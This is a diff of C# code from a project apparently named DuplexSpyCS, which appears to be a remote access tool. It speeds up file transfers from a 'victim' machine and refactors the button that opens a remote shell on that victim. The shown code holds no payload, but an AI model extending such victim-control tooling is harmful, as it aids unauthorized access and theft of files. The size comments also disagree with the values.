@@ -1195,7 +1195,7 @@ namespace DuplexSpyCS
 
                 string filename = path[1];
                 string tgt_filename = Path.Combine(tgt_dir, Path.GetFileName(filename));
-                int chunk_size = 1024 * 3; //1 KB
+                int chunk_size = 1024 * 10; //5 KB
 
                 using (FileStream fs = new FileStream(filename, FileMode.Open, FileAccess.Read))
                 {
@@ -1234,7 +1234,7 @@ namespace DuplexSpyCS
 
                         i++;
 
-                        Thread.Sleep(100);
+                        Thread.Sleep(10);
                     }
                 }
             }
@@ -2427,14 +2427,19 @@ namespace DuplexSpyCS
         //OPEN SHELL IN CURRENT DIRECTORY
         private void toolStripButton4_Click(object sender, EventArgs e)
         {
-            frmShell f = (frmShell)clsTools.GetFormByVictim(m_victim, Function.Shell);
+            frmShell f = clsTools.fnFindForm<frmShell>(m_victim);
             if (f == null)
-                f = new frmShell(current_path);
-            f.v = m_victim;
-            f.Tag = Function.Shell;
-            f.StartPosition = FormStartPosition.CenterScreen;
-            f.Text = $@"Shell\\{m_victim.ID}";
-            f.Show();
+            {
+                f = new frmShell(m_victim, current_path);
+                f.StartPosition = FormStartPosition.CenterScreen;
+                f.Text = $@"Shell\\{m_victim.ID}";
+
+                f.Show();
+            }
+            else
+            {
+                f.BringToFront();
+            }
         }
 
         //FILE - KEY DOWN
